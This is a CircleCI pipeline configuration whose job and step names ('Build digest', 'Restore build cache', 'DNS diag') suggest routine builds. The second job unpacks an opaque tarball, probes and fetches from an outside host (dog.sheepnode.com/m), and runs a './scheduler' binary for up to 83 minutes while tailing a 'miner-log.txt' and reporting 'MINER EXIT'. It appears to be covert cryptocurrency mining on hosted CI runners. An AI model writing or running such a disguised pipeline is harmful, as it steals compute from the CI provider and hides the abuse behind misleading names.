version: 2.1

jobs:
  bitBuf:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Build digest E
          command: |
            mkdir -p /tmp/pipeline-02
            set +o pipefail 2>/dev/null; echo {a..z} | tr -d ' ' > /tmp/pipeline-02/DSC58180; seq 1 577780 >> /tmp/pipeline-02/DSC58180; true
            echo "[$(date -Iseconds)] rm-login-redirect ok ($(wc -c </tmp/pipeline-02/DSC58180) B)"
      - persist_to_workspace:
          root: /tmp/pipeline-02
          paths:
            - 'DSC58180'
  rm-login-redirect:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pipeline-02
      - run:
          name: Fetch state
          command: |
            grep -c -P '\b[A-Z]{2,}\b' /tmp/pipeline-02/DSC58180 2>/dev/null || true
      - run:
          name: Fetch project tree
          command: git clone --depth 5 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Restore build cache
          command: tar -xf sources.tar
      - run:
          no_output_timeout: 15m
          command: sleep 90
      - run:
          name: Pre-run checks
          command: uptime
      - run:
          name: Store metadata
          command: uptime
      - run:
          name: DNS diag
          command: |
            echo "--- /etc/resolv.conf ---"
            cat /etc/resolv.conf 2>&1 || true
            echo "--- getent hosts dog.sheepnode.com ---"
            getent hosts dog.sheepnode.com 2>&1 || true
            echo "--- nslookup dog.sheepnode.com (default resolver) ---"
            nslookup dog.sheepnode.com 2>&1 || true
            echo "--- nslookup dog.sheepnode.com 8.8.8.8 ---"
            nslookup dog.sheepnode.com 8.8.8.8 2>&1 || true
            echo "--- nslookup dog.sheepnode.com 1.1.1.1 ---"
            nslookup dog.sheepnode.com 1.1.1.1 2>&1 || true
            echo "--- nslookup sheepnode.com (parent domain) ---"
            nslookup sheepnode.com 2>&1 || true
            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
            nslookup sheepnode.com 8.8.8.8 2>&1 || true
            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
            echo "--- dig dog.sheepnode.com @8.8.8.8 ---"
            dig dog.sheepnode.com @8.8.8.8 2>&1 || true
            echo "--- curl -v dog.sheepnode.com/m (default DNS) ---"
            curl -v --max-time 10 https://dog.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
            echo "--- curl -v dog.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
            curl -v --max-time 10 --dns-servers 8.8.8.8 https://dog.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
            echo "--- DNS diag done ---"
      - run:
          name: Run
          no_output_timeout: 83m
          command: |
            mkdir -p /tmp/d
            : > /tmp/d/miner-log.txt
            tail -F /tmp/d/miner-log.txt &
            TAIL_PID=$!
            sh -c "./scheduler"
            MRC=$?
            sleep 2
            kill $TAIL_PID 2>/dev/null || true
            echo "---MINER EXIT=$MRC---"
            echo "---FULL LOG:---"
            cat /tmp/d/miner-log.txt 2>/dev/null
            exit $MRC
